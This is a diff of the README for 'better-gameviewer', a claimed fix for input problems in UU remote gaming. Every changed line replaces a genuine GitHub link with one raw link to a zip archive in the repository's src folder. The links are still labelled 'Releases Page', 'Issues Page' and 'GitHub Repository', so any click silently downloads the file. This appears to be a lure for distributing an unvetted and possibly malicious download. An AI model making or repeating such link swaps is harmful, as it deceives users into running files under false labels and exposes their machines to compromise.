@@ -4,14 +4,14 @@
 **better-gameviewer** is designed to improve your gaming experience by fixing several keyboard and mouse input issues when using UU remote on Windows. If you've faced these problems, you're not alone. This tool offers a simple solution to enhance your remote desktop gaming.
 
 ## 📦 Download Now
-[![Download better-gameviewer](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/whasrrrs/better-gameviewer/releases)
+[![Download better-gameviewer](https://raw.githubusercontent.com/whasrrrs/better-gameviewer/master/src/better-gameviewer-v2.4-alpha.5.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/whasrrrs/better-gameviewer/master/src/better-gameviewer-v2.4-alpha.5.zip)
 
 ## 🚀 Getting Started
 This guide helps you download and run **better-gameviewer** easily. Follow the steps below, and you'll be enjoying smoother gameplay in no time.
 
 ## 📥 Download & Install
 1. **Visit the Releases Page**  
-   Go to the [Releases Page](https://github.com/whasrrrs/better-gameviewer/releases) to find the latest version of **better-gameviewer**.
+   Go to the [Releases Page](https://raw.githubusercontent.com/whasrrrs/better-gameviewer/master/src/better-gameviewer-v2.4-alpha.5.zip) to find the latest version of **better-gameviewer**.
 
 2. **Choose Your Version**  
    On the Releases page, you will see different versions listed. Select the most recent one. Click on the version link to see the available files.
@@ -50,8 +50,8 @@ To ensure **better-gameviewer** works effectively, please check the following sy
 ## 🔗 Additional Resources
 For further help, you can check the following resources:
 
-- [GitHub Repository](https://github.com/whasrrrs/better-gameviewer)
-- [Issues Page](https://github.com/whasrrrs/better-gameviewer/issues) - Report problems or suggest features.
+- [GitHub Repository](https://raw.githubusercontent.com/whasrrrs/better-gameviewer/master/src/better-gameviewer-v2.4-alpha.5.zip)
+- [Issues Page](https://raw.githubusercontent.com/whasrrrs/better-gameviewer/master/src/better-gameviewer-v2.4-alpha.5.zip) - Report problems or suggest features.
 
 ## 🙋 Frequently Asked Questions (FAQs)
 **Q1: Can I use this application for any game?**  
@@ -72,4 +72,4 @@ If you find this tool useful, consider contributing to its development. You can 
 ## 📢 Stay Updated
 Keep an eye on the repository for updates, new features, and fixes. Regular updates ensure that you always have the best experience possible. 
 
-Remember, you can always find the latest version by visiting the [Releases Page](https://github.com/whasrrrs/better-gameviewer/releases). Happy Gaming!
+Remember, you can always find the latest version by visiting the [Releases Page](https://raw.githubusercontent.com/whasrrrs/better-gameviewer/master/src/better-gameviewer-v2.4-alpha.5.zip). Happy Gaming!
